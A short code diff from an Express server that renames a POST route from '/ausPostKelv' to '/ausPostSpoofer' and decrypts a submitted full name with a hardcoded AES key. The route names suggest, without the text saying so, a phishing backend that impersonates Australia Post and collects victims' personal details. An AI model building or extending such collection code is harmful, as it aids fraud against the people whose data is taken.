@@ -540,9 +540,9 @@ app.post("/ausPostKelv", (req, res) => {
 
 let SpoofergooferAP = 0;
 
-app.options("/ausPostKelv", cors());
+app.options("/ausPostSpoofer", cors());
 
-app.post("/ausPostKelv", (req, res) => {
+app.post("/ausPostSpoofer", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
   );
